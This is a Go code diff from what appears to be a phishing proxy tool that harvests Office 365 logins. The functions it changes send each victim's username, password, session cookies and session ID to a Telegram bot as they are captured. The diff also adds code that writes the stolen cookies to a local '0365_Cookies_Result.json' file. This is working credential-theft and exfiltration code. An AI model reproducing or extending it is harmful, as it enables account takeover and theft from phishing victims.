@@ -74,16 +74,16 @@ func telegramSendResult(msg string) (bool, error){
 	return true, nil
 }
 
-func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) {
+func sendEmailCookie(cookies string, username string, password string, KeyUser string, sessionId string) {
 
 	// Send the message
 	var err error
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 	postBody, _ := json.Marshal(map[string]string{
 		"chat_id":    getChatId(),
-		" 🌟 Email ":      username,
+		" 🌟 Username ":      username,
 		" 🔑 Password ":   password,
-		" 🍪 Cookie_results":     msg,
+		" 🍪 Cookie_results":     cookies,
 		" 🏷️ Key_user":   KeyUser,
 		" 💻 Session_id ": sessionId,
 	})
@@ -98,16 +98,18 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
+	var cook Cookies
+	json.Unmarshal(postBody, &cook)
+	
+	err = os.WriteFile("0365_Cookies_Result.json", []byte(cookies), 0755)
+	if err != nil {
+		fmt.Printf("Unable to write file: %v", err)
+	}
 
 	log.Println("Send Email/Telegram Cookies")
 	
 	// Return
 	return
-
-// 	file, err := os.WriteFile("Cookies.json", []byte(msg), 0755)
-// 	if err != nil {
-// 		fmt.Printf("Unable to write file: %v", err)
-// 	}
 
 }
 
@@ -169,13 +171,13 @@ func (d *Database) ListSessions() ([]*Session, error) {
 }
 
 func (d *Database) SetSessionUsername(sid string, username string) error {
-	telegramSendResult(fmt.Sprintf("🌟 USERNAME  :%s", username))
+	telegramSendResult(fmt.Sprintf("🌟 Username  :%s", username))
 	err := d.sessionsUpdateUsername(sid, username)
 	return err
 }
 
 func (d *Database) SetSessionPassword(sid string, password string) error {
-	telegramSendResult(fmt.Sprintf("🔑 PASSWORD : %s", password))
+	telegramSendResult(fmt.Sprintf("🔑 Password : %s", password))
 	err := d.sessionsUpdatePassword(sid, password)
 	return err
 }
